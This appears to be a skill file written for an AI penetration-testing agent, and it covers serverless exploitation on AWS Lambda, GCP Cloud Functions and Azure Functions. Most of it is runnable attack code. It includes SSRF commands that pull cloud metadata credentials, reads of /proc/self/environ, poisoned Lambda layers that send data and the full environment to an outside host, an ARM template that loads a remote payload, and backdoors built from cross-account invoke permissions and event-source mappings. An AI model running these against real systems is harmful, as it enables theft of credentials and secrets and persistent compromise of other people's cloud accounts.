---
name: serverless-attacks
description: "Serverless function exploitation including Lambda/GCP/Azure Functions abuse, event injection, and environment theft"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders, runPrimitive]
primitives: [ssrfMetadata]
triggers: ["serverless", "lambda", "cloud functions", "azure functions", "function url", "serverless injection", "event injection", "cold start", "serverless security", "faas"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1059"]
owaspRefs: ["OWASP Serverless Top 10", "OWASP Top 10 A03:2021 Injection"]
---

# Serverless Attacks

## When to Use

- Target exposes serverless functions via API Gateway, Function URLs, or HTTP triggers
- Lambda, GCP Cloud Functions, or Azure Functions are identified in responses, headers, or error messages
- Function invocations return verbose errors (stack traces, env dumps, cold-start artifacts)
- Event-driven architecture detected (SQS, S3, EventBridge, Pub/Sub triggers)
- You have captured event payloads or function configuration data

## Do Not Use

- Target is a traditional server — use `injection/` or `recon/recon.md` instead
- No serverless indicators found (no `x-amzn-*` headers, no `server: Google-Forwarded-Proxy`, no function stack traces)
- Engagement rules prohibit cloud-side testing or function invocation
- Functions are behind WAF with rate limiting that blocks repeated invocation attempts

---

## 1. Auth Context

Before attacking serverless functions, capture and validate all available invocation context.

### Capture Sequence

```bash
# Identify function URL vs API Gateway
curl -sS -i "https://<function-url>.lambda-url.<region>.on.aws/" -o /dev/null -w '%{http_code}\n'
curl -sS -D - "https://<api-id>.execute-api.<region>.amazonaws.com/prod/health" | grep -i 'x-amzn\|apigw\|request-id'

# Fingerprint runtime from error responses / headers
curl -sS "https://<api-id>.execute-api.<region>.amazonaws.com/prod/debug" \
  -H 'Accept: application/json' --data '{"__probe__": 1}'
```

```http
GET /prod/%27%22%3E HTTP/1.1
Host: <api-id>.execute-api.<region>.amazonaws.com
```

Verbose stack traces on malformed input often reveal handler paths (`/var/task/index.js`, `/app/main.py`) and runtime versions.

### Record Evidence

Log the following without logging secret values:
- Function ARN/name and region
- Runtime (python3.11, nodejs18.x, java17, dotnet6)
- Trigger type and endpoint URL
- IAM role ARN or service account email

---

## 2. Lambda Exploitation

### Environment Variable Theft

Lambda functions commonly store secrets in environment variables. Exploit via:

#### Via Verbose Error Messages

```http
POST /prod/login HTTP/1.1
Content-Type: application/json

{"username": "admin'", "password": {"$ne": ""}}
```

Unhandled exceptions in many runtimes print `process.env`-adjacent context or the handler source line. Force a type error to dump the invocation context:

```json
{"username": ["array-not-string"], "password": null}
```

#### Via SSRF to Metadata Service

If the function fetches attacker-influenced URLs, pivot to the ECS/IMDS endpoints reachable from the execution environment:

```bash
# IMDSv1 (no token required) — works if the function's SSRF reaches link-local
curl -sS "https://target.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -sS "https://target.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Fetch the role's temporary credentials
curl -sS "https://target.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
```

IMDSv2 enforces a PUT-token hop — test whether the proxy preserves method:

```bash
curl -sS -X PUT "https://target.example.com/fetch?url=http://169.254.169.254/latest/api/token" \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'
```

#### Via /proc/self/environ

When injection reaches shell or file-read primitives inside the container:

```bash
# File-read primitive pointing at Lambda runtime paths
curl -sS "https://target.example.com/download?path=/proc/self/environ"
curl -sS "https://target.example.com/download?path=/var/task/.env"

# Node: error-based env reflection via injected template
# Python: os.environ leak through debug endpoints (Flask app.config, Django DEBUG=True)
```

Lambda environment variables also live in `/proc/1/environ` and are returned by `GetFunctionConfiguration` for anyone holding `lambda:GetFunctionConfiguration`.


### IAM Role Abuse

Lambda execution roles often have excessive permissions. Enumerate from inside the function:

```bash
# Who am I? (from inside the function via SSRF, or with any leaked credentials)
curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Enumerate what the role can do — simulate-principal-policy needs only iam:SimulatePrincipalPolicy
aws iam simulate-principal-policy \
  --policy-source-arn "arn:aws:iam::<account-id>:role/<lambda-exec-role>" \
  --action-names s3:GetObject s3:PutObject secretsmanager:GetSecretValue sts:AssumeRole dynamodb:Scan lambda:InvokeFunction \
  --output table

# With temporary credentials, enumerate accessible resources
export AWS_ACCESS_KEY_ID=<temp-key>; export AWS_SECRET_ACCESS_KEY=<temp-secret>; export AWS_SESSION_TOKEN=<token>
aws sts get-caller-identity
aws secretsmanager list-secrets --region <region>
aws s3 ls
```

Any `Allow` in the simulation output for `secretsmanager:GetSecretValue`, `ssm:GetParameter`, or wildcard `s3:*` on broad resources is a direct privilege finding.

### /tmp Persistence

Lambda functions have writable /tmp storage (512MB-10GB depending on config). Use for:

```bash
# /tmp persists across warm invocations in the same execution environment.
# A payload dropped there survives until the sandbox is recycled:
#   attacker-controlled function code (or injected layer):
python3 -c "
import os, json
open('/tmp/.persist.py','w').write('import socket,subprocess;subprocess.run([\"curl\",\"-sS\",\"https://oast.example.com/alive\"])')
"

# Warm-container proof (invoke twice; second run sees the artifact)
# Event 1: writes marker    -> {"op":"write"}
# Event 2: reads marker     -> {"op":"read"} returns content = warm reuse confirmed
```

Warm-environment persistence is a strong demonstration of why untrusted event data reaching file writes is critical.

### Lambda Layer Hijacking

Layers are extracted to `/opt` and appended to the runtime path (`PYTHONPATH`, `NODE_PATH`) **before** application code resolves imports:

```bash
# Build a poisoning layer: shadow a common import (e.g., requests for Python)
mkdir -p layer/python
cat > layer/python/requests.py <<'EOF'
import os, requests as _r
def get(*a, **kw):
    _r.post("https://oast.example.com/exfil", data={"url": a[0] if a else kw.get("url")})
    return _r.get(*a, **kw)
EOF

cd layer && zip -r ../evil-layer.zip python
aws lambda publish-layer-version \
  --layer-name legit-helper \
  --zip-file fileb://../evil-layer.zip \
  --compatible-runtimes python3.11 \
  --region <region>
```

If an attacker can publish a layer with a name/version the function auto-resolves (or update the function's layer list via `lambda:UpdateFunctionConfiguration`), every subsequent import routes through attacker code.


---

## 3. Event Injection

Craft malicious event payloads to manipulate function behavior.

### API Gateway Event Injection

```json
{
  "resource": "/login",
  "httpMethod": "POST",
  "headers": {"X-Forwarded-For": "127.0.0.1"},
  "queryStringParameters": {"debug": "true", "__env__": "1"},
  "body": "{\"username\": \"{{ .Table }}\", \"password\": {\"$ne\": \"\"}}",
  "requestContext": {"identity": {"sourceIp": "127.0.0.1"}}
}
```

Functions that serialize the raw `event` into logs, templates, or downstream queries inherit attacker-controlled structure. Template engines consuming event fields (Go `text/template`, JS string interpolation) turn `{{ .TableName }}`-style values into injection points.

### SQS Message Injection

```bash
aws sqs send-message \
  --queue-url https://sqs.<region>.amazonaws.com/<account-id>/<queue> \
  --message-body '{
    "task": "process_invoice",
    "template_url": "https://oast.example.com/evil.j2",
    "output_bucket": "attacker-drain"
  }'
```

If the queue is reachable and consumers trust message shape, injected fields redirect fetches (SSRF) or output destinations.

### S3 Event Injection

```bash
# Trigger a misconfigured pipeline by uploading an object with hostile key metadata
aws s3 cp payload.txt "s3://target-bucket/<script>alert(1)</script>.txt" \
  --metadata x-amz-meta-callback=https://oast.example.com/hook
```

Event-notification keys, ETags, and user metadata flow verbatim into handlers — test for log injection, command construction from filenames (`$(...)` in shell-based workers), and path traversal via key names (`../../etc/cron.d/x`).

### EventBridge / CloudWatch Event Injection

```bash
aws events put-events --entries '[{
  "Source": "com.target.billing",
  "DetailType": "InvoiceCreated",
  "Detail": "{\"invoice_id\": \"../../etc/passwd\", \"webhook\": \"https://oast.example.com\"}"
}]'
```

Events whose `Source`/`DetailType` match an existing rule are delivered to its targets — spoofing trusted producers tests consumer-side validation.


---

## 4. Function URL Attacks

Lambda Function URLs and Azure Direct Invocation bypass API Gateway entirely.

### Lambda Function URL Bypass

```bash
# Function URLs have their own auth setting: NONE, AWS_IAM, or resource-policy based
curl -sS -i "https://<func>.lambda-url.<region>.on.aws/"            # no auth
curl -sS -i "https://<func>.lambda-url.<region>.on.aws/?debug=1"    # probe verbose modes

# IAM-authed URL: still invocable with any valid SigV4 identity the policy trusts
curl -sS "https://<func>.lambda-url.<region>.on.aws/" \
  --aws-sigv4 "aws:amz:<region>:lambda" \
  --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" \
  -H "x-amz-security-token: $AWS_SESSION_TOKEN"
```

Function URLs bypass API Gateway WAF, throttling, and request validation entirely — compare behavior against the gateway route for the same function.

### Azure Functions Direct Invocation

```bash
# Master/host key in query string enables direct invocation outside HTTP triggers
curl -sS "https://<app>.azurewebsites.net/api/<fn>?code=<leaked-host-key>" \
  -H 'Content-Type: application/json' \
  -d '{"name": "probe"}'

# Admin endpoints expose status and keys when anonymous access is misconfigured
curl -sS "https://<app>.azurewebsites.net/admin/host/status"
```

### Bypassing API Gateway Authentication

```json
{
  "type": "TOKEN",
  "authorizationToken": "Bearer null",
  "methodArn": "arn:aws:execute-api:<region>:<account>:<api-id>/prod/POST/login"
}
```

Common authorizer weaknesses to test:

```bash
# 1. Deny-by-mismatch: request a path the authorizer doesn't map (policy uses resource: "*")
curl -sS -i "https://<api-id>.execute-api.<region>.amazonaws.com/$default/admin/users"

# 2. Cache poisoning: authorizer result cached by token — vary token casing/prefix
curl -sS -H 'Authorization: bearer <valid-token>' "https://<api-id>.../prod/admin"
curl -sS -H 'Authorization: Bearer%20<valid-token>' "https://<api-id>.../prod/admin"

# 3. Missing mapping template: invoke stage directly with unmatched method
curl -sS -X PUT "https://<api-id>.execute-api.<region>.amazonaws.com/prod/login"
```


---

## 5. GCP Cloud Functions Exploitation

### Metadata Access

```bash
# GCP metadata server — requires Metadata-Flavor header (no token hop)
curl -sS -H 'Metadata-Flavor: Google' \
  "https://target.example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

curl -sS -H 'Metadata-Flavor: Google' \
  "https://target.example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id"

curl -sS -H 'Metadata-Flavor: Google' \
  "https://target.example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true"
```

The returned OAuth token carries the function's service-account scopes — exchange it directly against Google APIs.

### Service Account Abuse

```bash
# Use the leaked token to enumerate reachable resources
export GOOGLE_OAUTH_ACCESS_TOKEN=<token>
curl -sS -H "Authorization: Bearer $GOOGLE_OAUTH_ACCESS_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=<project-id>"

gcloud projects get-iam-policy <project-id> --access-token-file token.txt
gcloud secrets list --project <project-id> --access-token-file token.txt

# Test secret access
gcloud secrets versions access latest --secret=<name> --project <project-id> --access-token-file token.txt
```

### GCP Cloud Functions Source Code Extraction

```bash
# Source lives in a GCS bucket named gcf-sources-<project>-<region> (or uploads/)
gsutil ls gs://gcf-sources-<project-number>-<region>/
gsutil cp -r "gs://gcf-sources-<project-number>-<region>/<fn>-hash/version-1/function-source.zip" .

unzip function-source.zip && grep -rnE 'API_KEY|SECRET|PASSWORD|TOKEN' .
```

If the bucket is public or readable with the leaked token, full source + embedded secrets are recoverable.


---

## 6. Azure Functions Exploitation

### Host Key Theft

```bash
# Azure Functions admin API leaks function/host keys when auth level misconfigured
curl -sS "https://<app>.azurewebsites.net/admin/functions/<fn>"          # config incl. keys (older runtimes)
curl -sS "https://<app>.azurewebsites.net/admin/host/keys"               # host master key list

# Source control token exposure via Kudu if anonymous enabled
curl -sS "https://<app>.scm.azurewebsites.net/api/settings"
```

A leaked `_master` key enables `PUT /admin/functions/<fn>` — full code replacement.

### ARM Template Injection

```json
{
  "properties": {
    "template": {
      "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
      "resources": [{
        "type": "Microsoft.Web/sites/config",
        "name": "<app>/appsettings",
        "apiVersion": "2022-03-01",
        "properties": {
          "WEBSITE_RUN_FROM_PACKAGE": "https://oast.example.com/payload.zip",
          "AzureWebJobsStorage": "<attacker-storage-connection>"
        }
      }]
    }
  }
}
```

`WEBSITE_RUN_FROM_PACKAGE` pointing at an attacker-controlled zip replaces the entire function app on next sync — the Azure equivalent of layer hijacking.

### Azure Function App Settings Theft

```bash
# With any contributor-scoped token:
az functionapp config appsettings list --name <app> --resource-group <rg>
# Returns ALL settings: connection strings, third-party API keys, feature flags

# Kudu-based dump if SCM creds are available:
curl -sS -u "<user>:<scm-key>" "https://<app>.scm.azurewebsites.net/api/diagnostics/runtimeenvvars"
```


---

## 7. Persistent Backdoor

### Lambda Layer Injection for Persistence

```bash
# Publish a layer whose python/ dir contains a sitecustomize.py — auto-imported by CPython at startup
mkdir -p layer/python && cat > layer/python/sitecustomize.py <<'EOF'
import urllib.request, os
try:
    env = dict(os.environ)
    urllib.request.urlopen(urllib.request.Request(
        "https://oast.example.com/beacon",
        data=str(env).encode()), timeout=2)
except Exception:
    pass
EOF

cd layer && zip -r ../persist-layer.zip python

aws lambda publish-layer-version --layer-name runtime-tuning \
  --zip-file fileb://../persist-layer.zip \
  --compatible-runtimes python3.11 nodejs18.x --region <region>

aws lambda update-function-configuration --function-name <target-fn> \
  --layers arn:aws:lambda:<region>:<attacker-account>:layer:runtime-tuning:1 \
  --region <region>
```

Requires `lambda:UpdateFunctionConfiguration` on the target — every invocation (including future ones) beacons.

### Event Source Mapping Persistence

```bash
# Attach an attacker-controlled SQS queue as a new trigger on the victim function
aws lambda create-event-source-mapping \
  --function-name <target-fn> \
  --event-source-arn arn:aws:sqs:<region>:<attacker-account>:drain-queue \
  --batch-size 1 --region <region>

# Then feed crafted events that the function processes with its real IAM role:
aws sqs send-message --queue-url https://sqs.<region>.<attacker-account>.queue.amazonaws.com/drain-queue \
  --message-body '{"op":"sync","src_bucket":"victim-data","dst":"attacker-drain"}'
```

The victim function's own permissions do the exfiltration — no code change required.

### Cross-Account Lambda Invocation Persistence

```bash
# Add attacker account as permitted invoker on the victim function policy
aws lambda add-permission --function-name <target-fn> \
  --statement-id backdoor-invoke \
  --action lambda:InvokeFunction \
  --principal <attacker-account-id> \
  --region <region>

# From attacker account, invoke at will:
aws lambda invoke --function-name arn:aws:lambda:<region>:<victim-account>:function:<target-fn> \
  out.json --region <region>
```


---

## 8. Data Exfiltration

### DNS Exfiltration


### HTTP Exfiltration


### S3/Cloud Storage Exfiltration


### CloudWatch Logs Exfiltration


---

## 9. Anti-Hallucination

### Verify Before Claiming

- **Do not assume** a function is vulnerable — invoke it and verify the error response contains sensitive data
- **Do not assume** environment variables contain secrets — invoke and dump actual environment
- **Do not assume** a function URL is public — test without authentication headers
- **Do not assume** IAM role is overprivileged — use `simulate-principal-policy` with concrete actions
- **Do not assume** source code is accessible — attempt actual download from GCS bucket
- **Do not assume** a function persists — check if it's been decommissioned between invocations

### Evidence Requirements

Every finding must include:
1. The exact function ARN/name, region, and trigger endpoint
2. The invocation request and full response (redact secrets, keep structure)
3. The IAM role ARN or service account email attached to the function
4. The specific overprivileged permission and its AWS/GCP/Azure ARN
5. Timestamp of invocation and cold-start indicators (duration headers)

### Reject Hallucinated Findings

If you cannot invoke the function (403, timeout, function not found), mark the finding as **unverified**. Do not claim a vulnerability exists based on inference alone. The EvidenceGate will reject findings without concrete invocation response evidence.

## Primitive Execution

The attack classes above are executable through the primitive registry. Invoke each
primitive by its id below using the run-primitive execution tool instead of re-firing
payloads manually; confirmed results pass through the evidence gate and commit as
findings with exploit proofs automatically.

| Primitive id | Coverage |
|---|---|
| `ssrfMetadata` | cloud metadata endpoint (169.254.169.254) probing |
